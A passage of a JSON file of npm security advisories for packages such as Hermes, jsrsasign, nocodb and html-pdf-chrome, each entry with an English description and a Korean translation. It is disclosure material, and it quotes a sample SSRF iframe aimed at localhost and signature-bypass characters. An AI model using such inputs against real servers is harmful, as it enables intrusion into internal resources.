    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10807\nhttps://snyk.io/vuln/SNYK-JS-BLAMER-559541\nhttps://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c\nhttps://github.com/advisories/GHSA-8cxp-cjm8-fj36",
    "name": "blamer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.1",
    "identifier": "1.0.1",
    "descriptionKR": "Blamer 1.0.1 이전 버전에서는 임의의 명령을 실행할 수 있습니다. Blamer에게 제공되는 인수의 일부로 임의의 명령을 주입하는 것이 가능합니다."
  },
  {
    "description": "Engine.IO before 4.0.0 and 3.6.0 allows attackers to cause a denial of service (resource consumption) via a POST request to the long polling transport.",
    "identifiers": "GHSA : GHSA-j4f2-536g-r55m\nCVE : CVE-2020-36048",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:04:32Z",
    "publishedAt": "2022-02-09T22:29:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36048\nhttps://github.com/socketio/engine.io/commit/734f9d1268840722c41219e69eb58318e0b2ac6b\nhttps://blog.caller.xyz/socketio-engineio-dos/\nhttps://github.com/bcaller/kill-engine-io\nhttps://github.com/advisories/GHSA-j4f2-536g-r55m",
    "name": "engine.io",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.6.0",
    "identifier": "3.6.0",
    "descriptionKR": "4.0.0 및 3.6.0 이전의 Engine.IO에서는 공격자가 긴 폴링 전송에 대한 POST 요청을 통해 서비스 거부(자원 소비)를 유발할 수 있습니다."
  },
  {
    "description": "Codecov npm module before 3.6.2 allows remote attackers to execute arbitrary commands via the \"gcov-args\" argument.",
    "identifiers": "GHSA : GHSA-mh2h-6j8q-x246\nCVE : CVE-2020-7596",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:34Z",
    "publishedAt": "2022-05-24T17:07:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7596\nhttps://snyk.io/vuln/SNYK-JS-CODECOV-543183\nhttps://github.com/advisories/GHSA-mh2h-6j8q-x246",
    "name": "codecov",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.6.1",
    "identifier": "3.6.2",
    "descriptionKR": "3.6.2 이전의 Codecov npm 모듈에서는 원격 공격자가 \"gcov-args\" 인수를 통해 임의의 명령을 실행할 수 있습니다."
  },
  {
    "description": "A logic vulnerability when handling the SaveGeneratorLong instruction in Facebook Hermes prior to commit b2021df620824627f5a8c96615edbd1eb7fdddfc allows attackers to potentially read out of bounds or theoretically execute arbitrary code via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-327c-qx3v-h673\nCVE : CVE-2020-1914",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:42Z",
    "publishedAt": "2022-05-24T17:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-1914\nhttps://github.com/facebook/hermes/commit/b2021df620824627f5a8c96615edbd1eb7fdddfc\nhttps://www.facebook.com/security/advisories/cve-2020-1914\nhttps://github.com/facebook/hermes/issues/373\nhttps://github.com/advisories/GHSA-327c-qx3v-h673",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.7.1",
    "identifier": "0.7.2",
    "descriptionKR": "b2021df620824627f5a8c96615edbd1eb7fdddfc를 커밋하기 전에 Facebook Hermes에서 SaveGeneratorLong 명령을 처리할 때의 논리 취약성으로 인해 공격자가 잠재적으로 범위를 벗어나 읽거나 조작된 JavaScript를 통해 임의의 코드를 실행할 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "An out-of-bounds read in the JavaScript Interpreter in Facebook Hermes prior to commit 8cb935cd3b2321c46aa6b7ed8454d95c75a7fca0 allows attackers to cause a denial of service attack or possible further memory corruption via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-x4cf-6jr3-3qvp\nCVE : CVE-2020-1915",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:39Z",
    "publishedAt": "2022-05-24T17:32:10Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-1915\nhttps://github.com/facebook/hermes/commit/8cb935cd3b2321c46aa6b7ed8454d95c75a7fca0\nhttps://www.facebook.com/security/advisories/cve-2020-1915\nhttps://github.com/facebook/hermes/issues/373\nhttps://github.com/advisories/GHSA-x4cf-6jr3-3qvp",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.7.1",
    "identifier": "0.7.2",
    "descriptionKR": "8cb935cd3b2321c46aa6b7ed8454d95c75a7fca0을 커밋하기 전에 Facebook Hermes의 JavaScript Interpreter에서 범위를 벗어난 읽기를 수행하면 공격자가 서비스 거부 공격을 유발하거나 조작된 JavaScript를 통해 추가 메모리 손상을 일으킬 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "### Impact\n\nJsrsasign supports JWS(JSON Web Signatures) and JWT(JSON Web Token) validation. However JWS or JWT signature with non Base64URL encoding special characters or number escaped characters may be validated as valid by mistake.\n\nFor example, even if a string of non Base64URL encoding characters such as `!@$%` or `\\11` is inserted into a valid JWS or JWT signature value string, it will still be a valid JWS or JWT signature by mistake.\n\nWhen jsrsasign's JWS or JWT validation is used in OpenID connect or OAuth2, this vulnerability will affect to authentication or authorization.\n\nBy our internal assessment, CVSS 3.1 score will be 8.6.\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N\n\n### Patches\nUsers validate JWS or JWT signatures should upgrade to 10.5.25.\n\n### Workarounds\nValidate JWS or JWT signature if it has Base64URL and dot safe string before\nexecuting JWS.verify() or JWS.verifyJWT() method.\n\n### ACKNOWLEDGEMENT\n\nThanks to Adi Malyanker and Or David for this vulnerability report. Also thanks for [Snyk security team](https://snyk.io/) for this coordination.\n\n### References\nhttps://github.com/kjur/jsrsasign/releases/tag/10.5.25\nhttps://github.com/kjur/jsrsasign/security/advisories/GHSA-3fvg-4v2m-98jf kjur's advisories\nhttps://github.com/advisories/GHSA-3fvg-4v2m-98jf github advisories\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25898\nhttps://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verifyJWT\nhttps://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verify\nhttps://kjur.github.io/jsrsasign/api/symbols/global__.html#.isBase64URLDot\nhttps://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWS-verification\nhttps://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWT-verification\nhttps://security.snyk.io/vuln/SNYK-JS-JSRSASIGN-2869122\n",
    "identifiers": "GHSA : GHSA-3fvg-4v2m-98jf\nCVE : CVE-2022-25898",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:02Z",
    "publishedAt": "2022-06-25T07:19:06Z",
    "references": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25898\nhttps://github.com/kjur/jsrsasign/releases/tag/10.5.25\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25898\nhttps://github.com/kjur/jsrsasign/commit/4536a6e9e8bcf1a644ab7c07ed96e453347dae41\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-2935898\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBKJUR-2935897\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2935896\nhttps://snyk.io/vuln/SNYK-JS-JSRSASIGN-2869122\nhttps://github.com/advisories/GHSA-3fvg-4v2m-98jf",
    "name": "jsrsasign",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.8.0, < 10.5.25",
    "identifier": "10.5.25",
    "descriptionKR": "### 영향\n\nJsrsasign은 JWS(JSON 웹 서명) 및 JWT(JSON 웹 토큰) 유효성 검사를 지원합니다. 그러나 Base64URL이 아닌 특수 문자 또는 숫자 이스케이프 문자를 인코딩하는 JWS 또는 JWT 서명은 실수로 유효한 것으로 확인될 수 있습니다.\n\n예를 들어 `!@$%` 또는 `\\11`과 같은 비 Base64URL 인코딩 문자열이 유효한 JWS 또는 JWT 서명 값 문자열에 삽입되더라도 실수로 여전히 유효한 JWS 또는 JWT 서명이 됩니다.\n\njsrsasign의 JWS 또는 JWT 유효성 검사가 OpenID 연결 또는 OAuth2에서 사용되는 경우 이 취약점은 인증 또는 권한 부여에 영향을 미칩니다.\n\n내부 평가에 따르면 CVSS 3.1 점수는 8.6입니다.\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N\n\n### 패치\nJWS 또는 JWT 서명을 검증하는 사용자는 10.5.25로 업그레이드해야 합니다.\n\n### 해결 방법\n이전에 Base64URL 및 점 안전 문자열이 있는 경우 JWS 또는 JWT 서명을 확인합니다.\nJWS.verify() 또는 JWS.verifyJWT() 메서드를 실행합니다.\n\n### 감사의 말\n\n이 취약점 보고서에 대해 Adi Malyanker 및 Or David에게 감사드립니다. 또한 이 조정에 대해 [Snyk 보안 팀](https://snyk.io/)에 감사드립니다.\n\n### 참조\nhttps://github.com/kjur/jsrsasign/releases/tag/10.5.25\nhttps://github.com/kjur/jsrsasign/security/advisories/GHSA-3fvg-4v2m-98jf kjur의 조언\nhttps://github.com/advisories/GHSA-3fvg-4v2m-98jf github 권고\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25898\nhttps://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verifyJWT\nhttps://kjur.github.io/jsrsasign/api/symbols/KJUR.jws.JWS.html#.verify\nhttps://kjur.github.io/jsrsasign/api/symbols/global__.html#.isBase64URLDot\nhttps://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWS-verification\nhttps://github.com/kjur/jsrsasign/wiki/Tutorial-for-JWT-verification\nhttps://security.snyk.io/vuln/SNYK-JS-JSRSASIGN-2869122"
  },
  {
    "description": "A type confusion vulnerability when resolving properties of JavaScript objects with specially-crafted prototype chains in Facebook Hermes prior to commit fe52854cdf6725c2eaa9e125995da76e6ceb27da allows attackers to potentially execute arbitrary code via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-f5x2-xv93-4p23\nCVE : CVE-2020-1911",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:37Z",
    "publishedAt": "2022-05-24T17:27:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-1911\nhttps://github.com/facebook/hermes/commit/fe52854cdf6725c2eaa9e125995da76e6ceb27da\nhttps://www.facebook.com/security/advisories/cve-2020-1911\nhttps://github.com/advisories/GHSA-f5x2-xv93-4p23",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.3",
    "identifier": "0.5.2",
    "descriptionKR": "fe52854cdf6725c2eaa9e125995da76e6ceb27da를 커밋하기 전에 Facebook Hermes에서 특별히 제작된 프로토타입 체인을 사용하여 JavaScript 개체의 속성을 확인할 때 유형 혼동 취약점으로 인해 공격자가 제작된 JavaScript를 통해 임의의 코드를 실행할 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "An out-of-bounds read/write vulnerability when executing lazily compiled inner generator functions in Facebook Hermes prior to commit 091835377369c8fd5917d9b87acffa721ad2a168 allows attackers to potentially execute arbitrary code via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-pf27-929j-9pmm\nCVE : CVE-2020-1912",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:42Z",
    "publishedAt": "2022-05-24T17:27:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-1912\nhttps://github.com/facebook/hermes/commit/091835377369c8fd5917d9b87acffa721ad2a168\nhttps://www.facebook.com/security/advisories/cve-2020-1912\nhttps://github.com/advisories/GHSA-pf27-929j-9pmm",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.3",
    "identifier": "0.5.2",
    "descriptionKR": "커밋 091835377369c8fd5917d9b87acffa721ad2a168 이전에 Facebook Hermes에서 느리게 컴파일된 내부 생성기 함수를 실행할 때 범위를 벗어난 읽기/쓰기 취약점으로 인해 공격자가 조작된 JavaScript를 통해 잠재적으로 임의 코드를 실행할 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "An Integer signedness error in the JavaScript Interpreter in Facebook Hermes prior to commit 2c7af7ec481ceffd0d14ce2d7c045e475fd71dc6 allows attackers to cause a denial of service attack or a potential RCE via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-gmpm-xp43-f7g6\nCVE : CVE-2020-1913",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:31Z",
    "publishedAt": "2022-05-24T17:27:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-1913\nhttps://github.com/facebook/hermes/commit/2c7af7ec481ceffd0d14ce2d7c045e475fd71dc6\nhttps://www.facebook.com/security/advisories/cve-2020-1913\nhttps://github.com/advisories/GHSA-gmpm-xp43-f7g6",
    "name": "hermes-engine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.3",
    "identifier": "0.5.2",
    "descriptionKR": "2c7af7ec481ceffd0d14ce2d7c045e475fd71dc6을 커밋하기 전에 Facebook Hermes의 JavaScript 인터프리터에 있는 정수 부호 오류로 인해 공격자가 조작된 JavaScript를 통해 서비스 거부 공격 또는 잠재적인 RCE를 유발할 수 있습니다. 이는 Hermes를 사용하는 응용 프로그램이 신뢰할 수 없는 JavaScript의 평가를 허용하는 경우에만 악용될 수 있습니다. 따라서 대부분의 React Native 애플리케이션은 영향을 받지 않습니다."
  },
  {
    "description": "Strapi v3.x.x versions and earlier contain a stored cross-site scripting vulnerability in file upload function. By exploiting this vulnerability, an arbitrary script may be executed on the web browser of the user who is logging in to the product with the administrative privilege.",
    "identifiers": "GHSA : GHSA-mcqm-6ff4-53qx\nCVE : CVE-2022-29894",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:03:59Z",
    "publishedAt": "2022-06-14T00:00:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-29894\nhttps://github.com/strapi/strapi\nhttps://jvn.jp/en/jp/JVN44550983/index.html\nhttps://strapi.io/\nhttps://github.com/advisories/GHSA-mcqm-6ff4-53qx",
    "name": "strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.6.10",
    "descriptionKR": "Strapi v3.x.x 이전 버전에는 파일 업로드 기능에 저장된 교차 사이트 스크립팅 취약점이 포함되어 있습니다. 이 취약점을 악용하여 관리자 권한으로 제품에 로그인하는 사용자의 웹 브라우저에서 임의의 스크립트가 실행될 수 있습니다."
  },
  {
    "description": "Insufficient Session Expiration in GitHub repository nocodb/nocodb prior to 0.91.9.",
    "identifiers": "GHSA : GHSA-6293-2vg2-pmp5\nCVE : CVE-2022-2064",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:59Z",
    "publishedAt": "2022-06-14T00:00:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2064\nhttps://github.com/nocodb/nocodb/commit/c9b5111b25aea2781e19395a8e9107ddbd235a2b\nhttps://huntr.dev/bounties/39523d51-fc5c-48b8-a082-171da79761bb\nhttps://github.com/nocodb/nocodb/pull/2262\nhttps://github.com/nocodb/nocodb/pull/2338\nhttps://github.com/nocodb/nocodb/releases/tag/0.91.9\nhttps://github.com/advisories/GHSA-6293-2vg2-pmp5",
    "name": "nocodb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.91.9",
    "identifier": "0.91.9",
    "descriptionKR": "0.91.9 이전의 GitHub 저장소 nocodb/nocodb에서 불충분한 세션 만료."
  },
  {
    "description": "Improper Privilege Management in GitHub repository nocodb/nocodb prior to 0.91.8.",
    "identifiers": "GHSA : GHSA-fq4h-m3c8-8m2v\nCVE : CVE-2022-2063",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:19Z",
    "publishedAt": "2022-06-14T00:00:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2063\nhttps://github.com/nocodb/nocodb/commit/269a19c2ad89a0e8a7596498e3806ff2ec1040c2\nhttps://huntr.dev/bounties/156f405b-21d6-4384-9bff-17ebfe484e20\nhttps://github.com/nocodb/nocodb/pull/2262\nhttps://github.com/nocodb/nocodb/pull/2337\nhttps://github.com/advisories/GHSA-fq4h-m3c8-8m2v",
    "name": "nocodb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.91.8",
    "identifier": "0.91.8",
    "descriptionKR": "0.91.8 이전의 GitHub 리포지토리 nocodb/nocodb에서 부적절한 권한 관리."
  },
  {
    "description": "A cross-site scripting (XSS) vulnerability in the Color Dialog plugin for CKEditor 4.15.0 allows remote attackers to run arbitrary web script after persuading a user to copy and paste crafted HTML code into one of editor inputs.",
    "identifiers": "GHSA : GHSA-4m44-5j2g-xf64\nCVE : CVE-2020-27193",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:32Z",
    "publishedAt": "2022-05-24T17:34:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-27193\nhttps://ckeditor.com/blog/CKEditor-4.15.1-with-a-security-patch-released/\nhttps://ckeditor.com/cke4/release/CKEditor-4.15.1\nhttps://ckeditor.com/ckeditor-4/download/\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://github.com/advisories/GHSA-4m44-5j2g-xf64",
    "name": "ckeditor4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.15.0",
    "identifier": "4.15.1",
    "descriptionKR": "CKEditor 4.15.0용 Color Dialog 플러그인의 XSS(교차 사이트 스크립팅) 취약성으로 인해 원격 공격자가 조작된 HTML 코드를 복사하여 편집기 입력 중 하나에 붙여넣도록 사용자를 설득한 후 임의의 웹 스크립트를 실행할 수 있습니다."
  },
  {
    "description": "Directus versions v9.0.0-beta.2 through 9.6.0 are vulnerable to server-side request forgery (SSRF) in the media upload functionality, which allows a low privileged user to perform internal network port scans.",
    "identifiers": "GHSA : GHSA-5h75-pvq4-82c9\nCVE : CVE-2022-23080",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:05Z",
    "publishedAt": "2022-06-23T00:00:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-23080\nhttps://github.com/directus/directus/commit/6da3f1ed5034115b1da00440008351bf0d808d83\nhttps://www.mend.io/vulnerability-database/CVE-2022-23080\nhttps://github.com/advisories/GHSA-5h75-pvq4-82c9",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 9.0.0-beta.2, < 9.7.0",
    "identifier": "9.7.0",
    "descriptionKR": "Directus 버전 v9.0.0-beta.2 ~ 9.6.0은 미디어 업로드 기능의 서버측 요청 위조(SSRF)에 취약하여 권한이 낮은 사용자가 내부 네트워크 포트 스캔을 수행할 수 있습니다."
  },
  {
    "description": "Cross-site Scripting (XSS) - Stored in GitHub repository nocodb/nocodb prior to 0.91.9.",
    "identifiers": "GHSA : GHSA-hv6q-5g4f-8897\nCVE : CVE-2022-2079",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:20Z",
    "publishedAt": "2022-06-15T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2079\nhttps://github.com/nocodb/nocodb/commit/362f8f0869989bc13bdcd66c6fc9c86ac79b9992\nhttps://huntr.dev/bounties/2615adf2-ff40-4623-97fb-2e4a3800202a\nhttps://github.com/nocodb/nocodb/issues/2262\nhttps://github.com/nocodb/nocodb/pull/2343\nhttps://github.com/nocodb/nocodb/releases\nhttps://github.com/advisories/GHSA-hv6q-5g4f-8897",
    "name": "nocodb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.91.9",
    "identifier": "0.91.9",
    "descriptionKR": "XSS(교차 사이트 스크립팅) - 0.91.9 이전의 GitHub 저장소 nocodb/nocodb에 저장되었습니다."
  },
  {
    "description": "### Impact\n\nAll versions of lettersanitizer below 1.0.2 are affected by a denial of service issue when processing a CSS at-rule `@keyframes`.\n\nThis package is depended on by [react-letter](https://github.com/mat-sz/react-letter), therefore everyone using react-letter is also at risk.\n\n### Patches\n\nThe problem has been patched in version 1.0.2.\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\n### References\n\nThe issue was originally reported in the react-letter repository: https://github.com/mat-sz/react-letter/issues/17\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [lettersanitizer](https://github.com/mat-sz/lettersanitizer/issues)\n* Email me at [contact@matsz.dev](mailto:contact@matsz.dev)\n",
    "identifiers": "GHSA : GHSA-7r3r-gq8p-v9jj\nCVE : CVE-2022-31103",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:35Z",
    "publishedAt": "2022-06-23T17:48:19Z",
    "references": "https://github.com/mat-sz/lettersanitizer/security/advisories/GHSA-7r3r-gq8p-v9jj\nhttps://github.com/mat-sz/react-letter/issues/17\nhttps://github.com/mat-sz/lettersanitizer/commit/96d3dfe2ef0465d47324ed4d13e91ba0816a173f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31103\nhttps://github.com/advisories/GHSA-7r3r-gq8p-v9jj",
    "name": "lettersanitizer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.2",
    "identifier": "1.0.2",
    "descriptionKR": "### 영향\n\n1.0.2 이하의 모든 버전의 lettersanitizer는 CSS at-rule `@keyframes` 처리 시 서비스 거부 문제의 영향을 받습니다.\n\n이 패키지는 [react-letter](https://github.com/mat-sz/react-letter)에 의존하므로 react-letter를 사용하는 모든 사람도 위험합니다.\n\n### 패치\n\n이 문제는 버전 1.0.2에서 패치되었습니다.\n\n### 해결 방법\n\n업그레이드 외에는 해결 방법이 없습니다.\n\n### 참조\n\n이 문제는 원래 react-letter 저장소(https://github.com/mat-sz/react-letter/issues/17)에서 보고되었습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [lettersanitizer](https://github.com/mat-sz/lettersanitizer/issues)에서 이슈 열기\n* [contact@matsz.dev](mailto:contact@matsz.dev)로 이메일을 보내주세요."
  },
  {
    "description": "The dot package v1.1.2 uses Function() to compile templates. This can be exploited by the attacker if they can control the given template or if they can control the value set on Object.prototype.",
    "identifiers": "GHSA : GHSA-297x-8xj4-vcxv\nCVE : CVE-2020-8141",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:34Z",
    "publishedAt": "2022-05-24T17:11:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-8141\nhttps://hackerone.com/reports/390929\nhttps://github.com/advisories/GHSA-297x-8xj4-vcxv",
    "name": "dot",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.2",
    "identifier": "1.1.3",
    "descriptionKR": "도트 패키지 v1.1.2는 Function()을 사용하여 템플릿을 컴파일합니다. 이는 공격자가 주어진 템플릿을 제어할 수 있거나 Object.prototype에 설정된 값을 제어할 수 있는 경우 악용될 수 있습니다."
  },
  {
    "description": "### Impact\n\nPassing some special values to the `filter` and `filterout` parameters can cause an abnormally high CPU. Impact on the performance of the servers and RSSHub services.\n\n### Patches\n\nIt is fixed in 5c4177441417b44a6e45c3c63e9eac2504abeb5b , please update to this or the later versions as soon as possible.\n\n### References\n\nFull report: https://github.com/DIYgod/RSSHub/issues/10045\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in <https://github.com/DIYgod/RSSHub/issues>\n* Email us at [i@diygod.me](mailto:i@diygod.me)\n\n### Credits\n\n@Rongronggg9 \n",
    "identifiers": "GHSA : GHSA-jvxx-v45p-v5vf\nCVE : CVE-2022-31110",
    "severity": "MODERATE",
    "updatedAt": "2023-07-24T19:38:36Z",
    "publishedAt": "2022-06-23T06:45:03Z",
    "references": "https://github.com/DIYgod/RSSHub/security/advisories/GHSA-jvxx-v45p-v5vf\nhttps://github.com/DIYgod/RSSHub/commit/4671720f4c5e1aaaad8fcc1dce684b6546baf2ff\nhttps://github.com/DIYgod/RSSHub/commit/5c4177441417b44a6e45c3c63e9eac2504abeb5b\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31110\nhttps://github.com/DIYgod/RSSHub/issues/10045\nhttps://github.com/advisories/GHSA-jvxx-v45p-v5vf",
    "name": "rsshub",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "### 영향\n\n일부 특수 값을 `filter` 및 `filterout` 매개변수에 전달하면 CPU가 비정상적으로 높아질 수 있습니다. 서버 및 RSSHub 서비스의 성능에 미치는 영향.\n\n### 패치\n\n5c4177441417b44a6e45c3c63e9eac2504abeb5b에서 수정되었습니다. 가능한 한 빨리 이 버전이나 이후 버전으로 업데이트하십시오.\n\n### 참조\n\n전체 보고서: https://github.com/DIYgod/RSSHub/issues/10045\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* <https://github.com/DIYgod/RSSHub/issues>에서 이슈 열기\n* [i@diygod.me](mailto:i@diygod.me)로 이메일을 보내주세요.\n\n### 크레딧\n\n@Rongronggg9"
  },
  {
    "description": "## Recommendation\nThis package is working as intended. A [Security](https://github.com/westy92/html-pdf-chrome#security) section has been added since v0.6.1 to detail proper usage of this library. Npm has revoked their advisory altogether.\n\n## Original Advisory\nAll versions of `html-pdf-chrome` are vulnerable to Server-Side Request Forgery (SSRF). The package executes HTTP requests if the parsed HTML contains external references to resources, such as `<iframe src=\"http://localhost\" height=\"800px\" width=\"800px\"></iframe>`. This allows attackers to access resources through HTTP that are accessible to the server, including private resources in the hosting environment.",
    "identifiers": "GHSA : GHSA-5p98-wpc9-g498",
    "severity": "HIGH",
    "updatedAt": "2023-01-11T05:05:59Z",
    "publishedAt": "2020-09-04T15:21:32Z",
    "references": "https://github.com/westy92/html-pdf-chrome/issues/249\nhttps://www.npmjs.com/advisories/1339\nhttps://github.com/advisories/GHSA-5p98-wpc9-g498",
    "name": "html-pdf-chrome",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.1",
    "identifier": "0.6.1",
    "descriptionKR": "## 추천\n이 패키지는 의도한 대로 작동합니다. v0.6.1부터 [보안](https://github.com/westy92/html-pdf-chrome#security) 섹션이 추가되어 이 라이브러리의 적절한 사용법을 자세히 설명합니다. Npm은 권고를 완전히 철회했습니다.\n\n## 원래 자문\n`html-pdf-chrome`의 모든 버전은 SSRF(Server-Side Request Forgery)에 취약합니다. 패키지는 구문 분석된 HTML에 `<iframe src=\"http://localhost\" height=\"800px\" width=\"800px\"></iframe>`과 같은 리소스에 대한 외부 참조가 포함된 경우 HTTP 요청을 실행합니다. 이를 통해 공격자는 호스팅 환경의 개인 리소스를 포함하여 서버에 액세스할 수 있는 HTTP를 통해 리소스에 액세스할 수 있습니다."
  },
  {
    "description": "JSDom improperly allows the loading of local resources, which allows for local files to be manipulated by a malicious web page when script execution is enabled.",
    "identifiers": "GHSA : GHSA-f4c9-cqv8-9v98\nCVE : CVE-2021-20066",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:43Z",
    "publishedAt": "2022-05-24T17:42:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-20066\nhttps://www.tenable.com/security/research/tra-2021-05\nhttps://github.com/jsdom/jsdom/issues/3124\nhttps://github.com/jsdom/jsdom/issues/3124#issuecomment-783502951\nhttps://github.com/advisories/GHSA-f4c9-cqv8-9v98",
    "name": "jsdom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 16.4.0",
    "identifier": "16.5.0",
    "descriptionKR": "JSDom은 로컬 리소스의 로드를 부적절하게 허용하므로 스크립트 실행이 활성화된 경우 악의적인 웹 페이지에서 로컬 파일을 조작할 수 있습니다."
  },
  {
    "description": "A use after free in hermes, while emitting certain error messages, prior to commit d86e185e485b6330216dee8e854455c694e3a36e allows attackers to potentially execute arbitrary code via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.",
    "identifiers": "GHSA : GHSA-mph8-6787-r8hw\nCVE : CVE-2021-24037",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:02:50Z",
    "publishedAt": "2022-05-24T19:05:34Z",
